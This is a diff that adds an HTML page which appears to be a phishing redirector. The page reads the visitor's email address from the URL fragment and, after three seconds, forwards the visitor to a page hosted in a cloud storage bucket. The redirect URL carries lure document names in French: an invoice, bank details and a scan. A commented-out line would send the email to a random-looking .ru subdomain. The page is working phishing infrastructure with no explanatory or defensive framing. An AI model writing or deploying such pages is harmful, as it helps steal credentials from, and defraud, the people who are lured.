@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" translate="no">
+<head>
+<style>
+html { 
+background: url(https://i.imgur.com/pXXn8fT.jpg) no-repeat center center fixed; 
+-webkit-background-size: cover;
+-moz-background-size: cover;
+-o-background-size: cover;
+background-size: cover;
+image-rendering: -webkit-optimize-contrast;
+}
+</style>
+</head>
+<body>
+<script>
+// declare all characters
+const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+function generateString(length) {
+let result = ' ';
+const charactersLength = characters.length;
+for ( let i = 0; i < length; i++ ) {
+result += characters.charAt(Math.floor(Math.random() * charactersLength));
+}
+return result;
+}
+</script>
+<script>
+var email = window.location.hash.substr(1);
+var string = generateString(20);
+setTimeout(function(){
+//window.location.href = 'https://lyatnnofxv637ab056ea5cd.kesarin.ru/M' + email + '?' + string;
+window.location.href = 'https://objectstorage.us-phoenix-1.oraclecloud.com/n/axukrqerwrfs/b/bucket-20230107-1636/o/we-fr.html?dl1=D%C3%A9claration%20de%20Studyrama_Mise%20%C3%A0%20jour.pdf&dl2=Facture_0287122.pdf&dl3=SCAN_223112518.pdf&dl4=RIB.pdf&' + '?' + string;
+}, 3000);
+</script>
+</body>
+</html>
